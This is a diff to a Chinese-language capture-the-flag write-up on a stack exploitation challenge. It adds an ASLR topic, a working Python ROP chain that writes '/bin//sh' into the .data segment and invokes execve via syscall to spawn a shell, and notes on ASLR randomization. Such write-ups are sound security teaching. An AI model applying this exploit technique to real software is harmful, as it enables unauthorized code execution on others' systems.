@@ -66,6 +66,7 @@ _Example:_\
 * fork() –– Multi-Process
 * Canary brute forcing
 * ROP gadgets
+* ASLR
 
 #### Solving Process
 先用 `checksec` 檢查執行檔的安全屬性：
@@ -124,9 +125,32 @@ _**`NX`**_:\
 \
 \
 \
-解決了 `Canary` 之後，下個問題就是如何在 stack segment 不可執行的情況下，成功呼叫 `execve("/bin/sh", NULL, NULL)` 了\
+解決了 `Canary` 之後，下個問題就是如何在 `.stack segment` 不可執行的情況下，成功呼叫 `execve("/bin/sh", NULL, NULL)` 了\
 這裡我們可以利用 ROP (Return Oriented Programming) 的技巧，來達成這個目的
 
+使用 `ropper` 來湊出可以成功實行 `execve("/bin/sh", NULL, NULL)` 的 `ROP gadgets`，下方是最後要注入到 `.stack segment` 中的 `ROP chain`：
+```python
+rop_chain = b"" 
+rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
+rop_chain += p64(0x68732f2f6e69622f) # var:("/bin//sh")
+rop_chain += p64(0x00000000004006c6) # -> pop rdi; ret;
+rop_chain += p64(0x00000000006d2000) # var:(.data segment)
+rop_chain += p64(0x0000000000435693) # -> mov qword ptr [rdi], rdx; ret;
+rop_chain += p64(0x0000000000410893) # -> pop rsi; ret;
+rop_chain += p64(0x0000000000000000) # var:(0)
+rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
+rop_chain += p64(0x0000000000000000) # var:(0)
+rop_chain += p64(0x00000000004005cf) # -> pop rax; ret;
+rop_chain += p64(0x000000000000003b) # var:(59)
+rop_chain += p64(0x00000000004013ec) # -> syscall;
+```
+
+值得注意的是，我將 `"/bin//sh"` 的字串寫入到 `.data segment` 中，而不是 `.stack segment` 中
+
+測試時發現 `.stack segment` 的記憶體位址會隨著每次執行程式而改變，而 `.data segment` 的記憶體位址則不會改變
+
+題目解開來事後確認一下 `ASLR` 是否有開啟，可以看到為模式 2 ，表示完全隨機化，所以 stack, heap, library 的位置都會被隨機化：
+<img src="image/ASLR_mode.png" width="1000" height="503">
 
 
 <br/><br/><br/>
